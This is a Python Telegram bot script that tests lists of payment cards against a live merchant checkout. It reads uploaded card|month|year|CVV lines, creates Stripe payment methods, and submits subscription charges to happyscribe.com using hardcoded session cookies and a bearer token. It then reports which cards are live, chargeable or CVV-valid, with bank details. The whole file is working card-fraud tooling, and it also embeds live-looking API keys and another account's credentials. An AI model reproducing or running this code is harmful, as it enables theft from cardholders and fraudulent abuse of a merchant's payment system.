import requests
import telebot
from telebot import types
from datetime import datetime, timedelta
import time
import json
from datetime import datetime, timedelta
import datetime
import time
token = '6555268832:AAHpn5ztqS7F1jO-28EKbv6xDJIWPtr-Mag'
bot=telebot.TeleBot(token,parse_mode="HTML")
def StripeChargebot(ccx):
	import requests
	import time
	ccx=ccx.strip()
	c = ccx.split("|")[0]
	mm= ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	time.sleep(3)
	headers = {
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'Accept': 'application/json',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'https://js.stripe.com/',
    'sec-ch-ua-mobile': '?1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform': '"Android"',
}

	data = f'type=card&billing_details[name]=yusuf&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=ec00e8d1-c512-4053-9a01-45f02b22c6ebd05330&muid=070b51ab-af54-48a9-9bb3-c839cf612ad9cc2d12&sid=e5761279-6e4b-4a94-b9d0-6a2912f6be1b9e3827&payment_user_agent=stripe.js%2F7c4530bc8b%3B+stripe-js-v3%2F7c4530bc8b%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=34223&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZpWIzvedNJimC2YmM8_PHpVj87TDHfiH02_eX3K9jRXaXJxrvwEb8Y7VpbrJgW2Uw3JptNsHwRtULWdnkSqoRIFNivY4LsCnvYk1hsu7cKNDnJeo-mw07tkf0Ypx9pvBUz3xsjeKGP-CuXddiYGXT-bXj0kFr2Hs2fBRVaNxYqIT7CEUTLZRwueaZxlnbeEHGFCoedQyBCmOjMWOafo7onF1xSfEFyBQ2PCpRBfWQoIctfufn9AHodQ7-t2dg_xRGmPT1-BO8jVYFRDPBu7uRXG_Oeo7WZdXDZWHJQ54Vt55o1fao8V1E9BMHZxnfS70Yya9ANWNE4WlrZxHTP41C3OHPQSvMPxHN-6Lr5-9fhqxH6UQICAes_etb5Zl_E_UykxYut38NfKxKD7g5TsSGmBbOyU-jerng3x0T9NoiDOY5vUja0zeLQ0xAuz6BJWm_G_IxxCuKvFjFEfFwjyGbcXW9i-L0ACHGgyJiCfxXWRoBtip30C8SoxFIUYqlZx4WtcW9L-pK5JWeSS_vAUne-IvX7tyOyola8PkwqTUW_wIh2D9-8lADvQKs8KH1_OcHv39uH37IN8Ts0S4Je59tAuMypYeVGzBIN3v0EGolQ8HD0VwZfHRZ645EdhhvUXB1_aJogVbEOLsk8aENk8WpuI_vi7dRHWUGkvQFwoj7cpAecUoxefMdvg_zKVMrMaTUZuYzWgQa6j96YXt-zE5xxGq4sT73NwxagxVgnCA4yOTw2RraNCoAqCA8XIUpaXVBasOSHvhtUR9v1M9ue8Jxs9QGxMxY3mBfLAqY2XqZZbFoPGB5Qa18RkzgblYmQloGM_eMHvN-9uhAVWn959EKc-RirNyhwnS3lTVbfQFc7CFUB1RZqWdWu25XXujsZ5-0G-RO0fu06MV4Q3W8sm5KzmnZubeuBhC1VtODqSxpgg0JW7amEzn_WnfCP73AkrORBkzKmD-JQdFJyNuFAmyrUbrQ3KR1cLFTU9k4UcWnMuqXiwLD8LWsjWXDGM-o377wntT2917rEYW78_P9PXBF1AlkMzNka8Bwaz7SS_1iaejWGllLBqpPZNB_8Pv3LGNffMHitNHF7MlGuhmLRi0U7bhKiJpEMI_3EunTiJSgM0R037L4H5L0HJWtKdUNz78fNh5eVSF5xhDN6K401ZROE3IoZL-0YCPhtEFD567_TWUlEo7dwI6MxrH8Og1npa-5iA03EM42vPSUvLZGWZ6AhVV6n9LOlTETR40ResvEOIBDQeENUFQMYqr2-V5_NYjAClNK9MvLGVNE_cg9QbNCcHxkSEoL919SdUQ8EqB0Ow8SNpeHOc6fIcFrKbw0E_duLBrlnTkQFHIr9LfWHmUf7MRb7O7ZpxX1whMzNNmheBiFgeU0Wk0RJwdcH9qdrnkH-xe1zWHDTZFRHZu9rsAnmU0GZvc3RKZCBgTQKD57X9BeFXQ0vfGN7K0cKTnCXD6RbJolbNy74CCGwQiYwSxFpNLLLMD4FvsNxrzIQkDS_Tje9KCnRo-mbHWSuGowCbxPp0zLPgIAys0_lgob_qY_m8TfLVskY7Rws-TguaK3lyyTTxci7lR6QjaBkqujDgSED7eGiVSLbdj5K5VxnABnNhMDyeh6KnnDU1dQKK_BjHh6uNipam8Cvd4UaBl7vt-enozGGri6o8_sMsWJzTSmqIh9D2rhj5uU_yDXVujGfLjsEVxb0Pl8ckSwlMProPj3qUQlPZxtHa7qJKZLukl6n2F_hL6SZrl2_RqLDCGdNca0ihRNbTCwJ3h0WZ0wrx11S9ivTyXCqAr4N2GwGapFNZl-0YFiAoPlzThcmg9--KQGimYsXYlPT0EBlmQgjpPaCDVZEttOXzHORebYZenwFBliFQ74N1Ywe7XfKaPpdYgQt_iz1JhG60T0f_bl4CPPVnfAmqCyJyb6PtZ_l1Q4GH0zHhJZOcW4ZCox6OQaSEEbTUDzX9Ym8fF4qS3gbmcK8hURrxDd35DbkEnIaCiJ6Wp7Z4myYhUBuQRhmptEGyDbeG7esmKDOMm1t8lUibYVdBXKOfVsCALfTfdTKMvSTkrO1vZsY8OVz6H0aJVtd5EQ1F2vwh1FmK4Shh99PVe8NYuuD875zQWZQ5G_SVAPsZbrDHmmhnyHD-_B7de4yKiKxGnlcFQNmHhNyW5wqqZFmxByXs63V8kW7o2V4cM5mNsJAqHNoYXJkX2lkzhQ8hB-ia3KoMWYzNDEzYzWicGQA.Ve3_iKk831BYCZnTHmuJClr2wfupKYsq57OLjjs5Txs'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	ide=response.json()['id']
	cookies = {
    'ahoy_visitor': '9e6a40b7-decd-48d5-9f8d-17eb71b447b2',
    'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNakF3T1RrNU4xMHNJalIyWjNCT1ltZHJWR2REY1ZFMVdIbHpZakpFSWl3aU1UY3hOamczT0RVNU55NDVOVEF6T0RBeklsMD0iLCJleHAiOiIyMDI0LTA2LTA0VDA2OjQzOjE3Ljk1MFoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--9de9be21204a15255de7267857f5b4173576332f',
    'unsecure_is_signed_in': '1',
    'cc_cookie': '%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-05-28T06%3A43%3A23.433Z%22%2C%22consentId%22%3A%2262fc216f-df44-47fb-ac7b-b57041b6c70c%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-05-28T06%3A43%3A23.433Z%22%7D',
    '_gcl_au': '1.1.692315671.1716878603',
    'intercom-device-id-frdatdus': '2c8a6d60-3354-4ff1-b9df-1bceb6152d76',
    '__stripe_mid': '68f72840-ad04-4025-8fab-3f9d8fd9c1d8b7a23d',
    '_cioid': '12009997',
    'ahoy_visit': 'a471fd48-46d0-4be5-b432-e79d47bf65d1',
    '_ga': 'GA1.2.1541740028.1716878601',
    '_gid': 'GA1.2.1473912494.1717088350',
    '_ga_4T8KCV9Y2D': 'GS1.1.1717088350.6.1.1717088405.5.0.0',
    'intercom-session-frdatdus': 'WEtLdlIxeUtLSjZXQnFvY0JzOHJpR3pxUW0vTEFkVjd4VnJjNHRWSzRXMnZzQVJoY2Jqcjg3c2NRUkRSYTVNUi0tTTNzeG9oV1hhRGdFWlVJSkVoQ3YrUT09--33b009d2bec74f6e465a898f9cfd06fb80974b06',
    '_transcribe_session': '5xjPwnOHAii1bK%2BYOp5i0UDiK70x05sR935QTHUQZP6JcYYlwJrfEVrEJ5CctiLXTKBKWn%2BOtsoCWLU280xj5Pja18yxyKiUqYU9N1%2BcMAWNlagUb8hVwq5eRelsI%2FKgFLpdYtwgaeg1FzgjYLDrMxDV4VHTQVPHxNmk2%2F0MPpmUYC8mpnqWbOEVnCNfANfCH21cYwxSRGn0DRCbX%2FGO3%2F5RvD6hW6G28eBbsiRJQBHoViHNh1G%2Flz0QwPIPeM2sJ3Uw6B5JSuXmNVf%2B2yL3hHl4%2BTb%2Fl37I5DoRS5pg6sZmzoeNSdVB95BD78xnZjGsSJZINMWUmUv4aNMyk1WFWsZ%2Fr2%2FFKy9kuTLlPLwub7kh%2BUBVPSE%2Fr1fGmhJR%2BoPjpz3QFh9u6Sy874gkf9DhGPh1KA%3D%3D--GQEnaiTaieDhXbHE--JVt0gBaiNPmzEc6snTZZAg%3D%3D',
}

	headers = {
    'accept': 'application/json',
    'accept-language': 'ar,en;q=0.9,en-US;q=0.8',
    'authorization': 'Bearer wN76rvX5Rblg3yh2dklWuAtt',
    'content-type': 'application/json',
    # 'cookie': 'ahoy_visitor=9e6a40b7-decd-48d5-9f8d-17eb71b447b2; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNakF3T1RrNU4xMHNJalIyWjNCT1ltZHJWR2REY1ZFMVdIbHpZakpFSWl3aU1UY3hOamczT0RVNU55NDVOVEF6T0RBeklsMD0iLCJleHAiOiIyMDI0LTA2LTA0VDA2OjQzOjE3Ljk1MFoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--9de9be21204a15255de7267857f5b4173576332f; unsecure_is_signed_in=1; cc_cookie=%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-05-28T06%3A43%3A23.433Z%22%2C%22consentId%22%3A%2262fc216f-df44-47fb-ac7b-b57041b6c70c%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-05-28T06%3A43%3A23.433Z%22%7D; _gcl_au=1.1.692315671.1716878603; intercom-device-id-frdatdus=2c8a6d60-3354-4ff1-b9df-1bceb6152d76; __stripe_mid=68f72840-ad04-4025-8fab-3f9d8fd9c1d8b7a23d; _cioid=12009997; ahoy_visit=a471fd48-46d0-4be5-b432-e79d47bf65d1; _ga=GA1.2.1541740028.1716878601; _gid=GA1.2.1473912494.1717088350; _ga_4T8KCV9Y2D=GS1.1.1717088350.6.1.1717088405.5.0.0; intercom-session-frdatdus=WEtLdlIxeUtLSjZXQnFvY0JzOHJpR3pxUW0vTEFkVjd4VnJjNHRWSzRXMnZzQVJoY2Jqcjg3c2NRUkRSYTVNUi0tTTNzeG9oV1hhRGdFWlVJSkVoQ3YrUT09--33b009d2bec74f6e465a898f9cfd06fb80974b06; _transcribe_session=5xjPwnOHAii1bK%2BYOp5i0UDiK70x05sR935QTHUQZP6JcYYlwJrfEVrEJ5CctiLXTKBKWn%2BOtsoCWLU280xj5Pja18yxyKiUqYU9N1%2BcMAWNlagUb8hVwq5eRelsI%2FKgFLpdYtwgaeg1FzgjYLDrMxDV4VHTQVPHxNmk2%2F0MPpmUYC8mpnqWbOEVnCNfANfCH21cYwxSRGn0DRCbX%2FGO3%2F5RvD6hW6G28eBbsiRJQBHoViHNh1G%2Flz0QwPIPeM2sJ3Uw6B5JSuXmNVf%2B2yL3hHl4%2BTb%2Fl37I5DoRS5pg6sZmzoeNSdVB95BD78xnZjGsSJZINMWUmUv4aNMyk1WFWsZ%2Fr2%2FFKy9kuTLlPLwub7kh%2BUBVPSE%2Fr1fGmhJR%2BoPjpz3QFh9u6Sy874gkf9DhGPh1KA%3D%3D--GQEnaiTaieDhXbHE--JVt0gBaiNPmzEc6snTZZAg%3D%3D',
    'origin': 'https://www.happyscribe.com',
    'priority': 'u=1, i',
    'referer': 'https://www.happyscribe.com/v2/11515877/checkout?new_subscription_interval=month&plan=basic_2023_05_01&step=billing_details',
    'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
}

	json_data = {
    'id': 11194949,
    'address': 'Los Aeles',
    'name': 'mazen Games',
    'country': 'US',
    'vat': None,
    'billing_account_id': 11194949,
    'last4': '3063',
    'orderReference': 'hcktezggtr',
    'user_id': 12009997,
    'organization_id': 11515877,
    'hours': 0,
    'balance_increase_in_cents': None,
    'payment_method_id': ide,
    'transcription_id': None,
    'plan': 'basic_2023_05_01',
    'order_id': None,
    'recurrence_interval': 'month',
    'extra_plan_hours': None,
}

	req = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
	print(req.json()['error'])
	if 'Retry later' in req.text:
		ms = 'risk'
		return ms
		time.sleep(12)
	try:
		msg = req.json()['error']
		print(ccx,'¦',msg)
		if "Your card has insufficient funds." in req.json()['error']:
			ms = 'Your card has insufficient funds.'
			return ms
		else:
			ms = req.json()['error']
			return ms
	except:
		if 'requires_action' in req.json():
			ms = '3D Required'
			return ms
		else:
			return req.json()
@bot.message_handler(commands=["start"])
def start(message):
	bot.reply_to(message,'''ابعت الكومبه وانجز عايز افحص 

BY :   @hhhh4x''')
@bot.message_handler(content_types=["document"])
def main(message):
	dd = 0
	rs = 0
	rsk = 0
	cek = 0
	nop = 0
	live = 0
	ch = 0
	ko = (bot.reply_to(message,"𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃 𝚆𝙷𝙸𝙻𝙴 𝚈𝙾𝚄𝚁 𝙲𝙰𝚁𝙳𝚂 𝙰𝚁𝙴 𝙱𝙴𝙸𝙽𝙶 𝙲𝙷𝙴𝙲𝙺 𝙰𝚃 𝚃𝙷𝙴 𝙶𝙰𝚃𝙴𝚆𝙰𝚈 stripe charge 𝙱𝚈  @hhhh4x").message_id)
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
	with open("combo-sjad.txt", "wb") as w:
		w.write(ee)
	try:
		with open("combo-sjad.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			for cc in lino:
				try:
					url = ('https://lookup.binlist.net/'+cc[:6])
					data = requests.get(url).json()
					
				except:
					pass
				try:
					bank=(data['bank']['name'])
				except:
					bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					emj=(data['country']['emoji'])
				except:
					emj=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					cn=(data['country']['name'])
				except:
					cn=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					dicr=(data['scheme'])
				except:
					dicr=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					typ=(data['type'])
				except:
					typ=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					url=(data['bank']['url'])
				except:
					url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					bran = (data['brand'])
				except:
					bran = ('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				#	start_time = time.time()

				
				start_time = time.time()
				try:
					last = str(StripeChargebot(cc))
				except Exception as e:
					print(e)
					last=e
				mes = types.InlineKeyboardMarkup(row_width=1)
				cm1 = types.InlineKeyboardButton(f"-> {last}", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"-> {cc}", callback_data='u8')
				cm3 = types.InlineKeyboardButton(f"- Charged ☠ -> {ch} ", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"- Approved 🤑 -> {live} ", callback_data='x')
				cm7 = types.InlineKeyboardButton(f"- Cvv ✅ -> {rs} ", callback_data='x')
				cm5 = types.InlineKeyboardButton(f"- Declined ❌ -> {dd} ", callback_data='x')
				cm8 = types.InlineKeyboardButton(f"- Risk Wait ❌ -> {rsk} ", callback_data='x')
				cm10 = types.InlineKeyboardButton(f"- Incorrect CC ❌ -> {nop} ", callback_data='x')
				cm6 = types.InlineKeyboardButton(f"- Total -> {total}/{cek}", callback_data='x')
				mes.add(cm1, cm2, cm3, cm4, cm7,cm5,cm8,cm10,cm6)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃 𝚆𝙷𝙸𝙻𝙴 𝚈𝙾𝚄𝚁 𝙲𝙰𝚁𝙳𝚂 𝙰𝚁𝙴 𝙱𝙴𝙸𝙽𝙶 𝙲𝙷𝙴𝙲𝙺 𝙰𝚃 𝚃𝙷𝙴 𝙶𝙰𝚃𝙴𝚆𝙰𝚈 stripe charge 𝙱𝙾𝚃𝙱𝚈  @hhhh4x ''', reply_markup=mes)
				end_time = time.time()
				execution_time = end_time - start_time
				msg = f'''
Approved Card ✅-
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
- the bin • <code>{cc[:6]}</code>
• <code>{bank}</code>
• <code>{dicr}  - {bran}</code>
• <code>{cn} -  [{emj}]</code>
--------------------------------------------
- Programmer • @hhhh4x</strong>'''
				msgcvc = f'''
Cvv Card ✅
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
- the bin • <code>{cc[:6]}</code>
• <code>{bank}</code>
• <code>{dicr}  - {bran}</code>
• <code>{cn} -  [{emj}]</code>
--------------------------------------------
- Programmer • @hhhh4x</strong>'''
				if 'Your card was declined.' in last:
					dd += 1
					cek+=1
					time.sleep(12)
				elif 'Your card number is incorrect.' in last:
					nop += 1
					cek+=1
					time.sleep(12)
				elif 'error' in last:
					nop += 1
					cek+=1
					time.sleep(12)
				elif "3D Required" in last:
					rs+=1
					cek+=1
					bot.reply_to(message, msgcvc)
					time.sleep(12)
				elif "Your card's security code is incorrect." in last:
					rs+=1
					cek+=1
					bot.reply_to(message, msgcvc)
					time.sleep(12)
				elif 'risk' in last:
					rsk+=1
					cek+=1
					time.sleep(12)
				elif 'Your card has insufficient funds.' in last:
					live+=1
					cek+=1
					bot.reply_to(message, msg)
					time.sleep(12)
				else:
					ch += 1
					cek+=1
					msg1 = f'''
<strong>- Approved Charge Card ✅
--------------------------------------------
• Card •<code> {cc}</code>
--------------------------------------------
- the bin • <code>{cc[:6]}</code>
• <code>{bank}</code>
• <code>{dicr}  - {bran}</code>
• <code>{cn} -  [{emj}]</code>
--------------------------------------------
- Programmer • @hhhh4x</strong>'''
					bot.reply_to(message, msg1)
					time.sleep(12)
	except Exception as eo:
		print(eo)
print("تم تشغيل البوت")
bot.polling()